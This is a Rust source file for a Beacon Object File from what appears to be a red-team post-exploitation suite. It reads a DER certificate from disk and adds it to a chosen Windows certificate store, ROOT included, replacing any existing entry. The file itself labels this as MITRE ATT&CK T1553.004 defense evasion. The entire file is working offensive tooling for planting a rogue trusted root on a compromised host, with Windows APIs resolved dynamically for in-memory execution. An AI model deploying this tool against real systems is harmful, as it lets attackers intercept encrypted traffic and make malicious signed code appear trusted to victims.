// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! Add a DER-encoded certificate to a local Windows certificate store.
//!
//! Opens <cert_file_path>, reads DER bytes, then calls
//! CertOpenSystemStoreA → CertAddEncodedCertificateToStore → CertCloseStore.
//!
//! Args: <store_name> <cert_file_path>
//!   store_name: MY | ROOT | CA | TRUST
//!
//! MITRE ATT&CK: T1553.004 (Subvert Trust Controls: Install Root Certificate)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::{string::String, vec};
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1553.004",
        name: "Subvert Trust Controls: Install Root Certificate",
        tactic: "Defense Evasion",
    },
];

const GENERIC_READ: u32      = 0x8000_0000;
const OPEN_EXISTING: u32     = 3;
const FILE_SHARE_READ: u32   = 1;
const INVALID_HANDLE_VALUE: isize = -1isize;
const X509_ASN_ENCODING: u32 = 1;
const CERT_STORE_ADD_REPLACE_EXISTING: u32 = 3;

dfr_fn!(
    create_file_a(
        lp_file_name: *const i8,
        dw_desired_access: u32,
        dw_share_mode: u32,
        lp_security_attributes: *mut u8,
        dw_creation_disposition: u32,
        dw_flags_and_attributes: u32,
        h_template_file: isize,
    ) -> isize,
    module = "kernel32.dll",
    api    = "CreateFileA"
);

dfr_fn!(
    read_file(
        h_file: isize,
        lp_buffer: *mut u8,
        n_number_of_bytes_to_read: u32,
        lp_number_of_bytes_read: *mut u32,
        lp_overlapped: *mut u8,
    ) -> i32,
    module = "kernel32.dll",
    api    = "ReadFile"
);

dfr_fn!(
    close_handle(h_object: isize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

dfr_fn!(
    cert_open_system_store_a(
        h_prov: usize,
        sz_subsystem_protocol: *const i8,
    ) -> *mut u8,
    module = "crypt32.dll",
    api    = "CertOpenSystemStoreA"
);

dfr_fn!(
    cert_add_encoded_certificate_to_store(
        h_cert_store: *mut u8,
        dw_cert_encoding_type: u32,
        pb_cert_encoded: *const u8,
        cb_cert_encoded: u32,
        dw_add_disposition: u32,
        pp_cert_context: *mut *const u8,
    ) -> i32,
    module = "crypt32.dll",
    api    = "CertAddEncodedCertificateToStore"
);

dfr_fn!(
    cert_close_store(h_cert_store: *mut u8, dw_flags: u32) -> i32,
    module = "crypt32.dll",
    api    = "CertCloseStore"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let store_name = String::from(parser.get_str());
    let cert_path  = String::from(parser.get_str());

    if store_name.is_empty() || cert_path.is_empty() {
        return Err("usage: add-local-cert <store_name> <cert_file_path>");
    }
    if store_name.len() > 32  { return Err("store name too long"); }
    if cert_path.len()  > 512 { return Err("path too long"); }

    let mut store_cstr = [0i8; 36];
    let mut path_cstr  = [0i8; 516];
    for (i, b) in store_name.bytes().enumerate() { if i + 1 < store_cstr.len() { store_cstr[i] = b as i8; } }
    for (i, b) in cert_path.bytes().enumerate()  { if i + 1 < path_cstr.len()  { path_cstr[i]  = b as i8; } }

    // Open cert file
    let hfile = unsafe {
        create_file_a(
            path_cstr.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            0,
        )
    }.map_err(|_| "resolve failed")?;

    if hfile == INVALID_HANDLE_VALUE {
        return Err("cert file open failed");
    }

    // Read up to 8 KB of DER data
    let mut cert_buf = vec![0u8; 8192];
    let mut bytes_read: u32 = 0;
    let rc_read = unsafe {
        read_file(
            hfile,
            cert_buf.as_mut_ptr(),
            cert_buf.len() as u32,
            &mut bytes_read,
            core::ptr::null_mut(),
        )
    }.map_err(|_| "resolve failed")?;

    let _ = unsafe { close_handle(hfile) };

    if rc_read == 0 || bytes_read == 0 {
        return Err("cert file read failed");
    }

    // Open certificate store
    let hstore = unsafe {
        cert_open_system_store_a(0, store_cstr.as_ptr())
    }.map_err(|_| "resolve failed")?;

    if hstore.is_null() {
        return Err("cert store open failed");
    }

    // Add certificate
    let rc_add = unsafe {
        cert_add_encoded_certificate_to_store(
            hstore,
            X509_ASN_ENCODING,
            cert_buf.as_ptr(),
            bytes_read,
            CERT_STORE_ADD_REPLACE_EXISTING,
            core::ptr::null_mut(),
        )
    }.map_err(|_| "resolve failed")?;

    let _ = unsafe { cert_close_store(hstore, 0) };

    if rc_add == 0 {
        return Err("cert add failed");
    }

    println!("[+] certificate added to store: {}", store_name);
    Ok(())
}
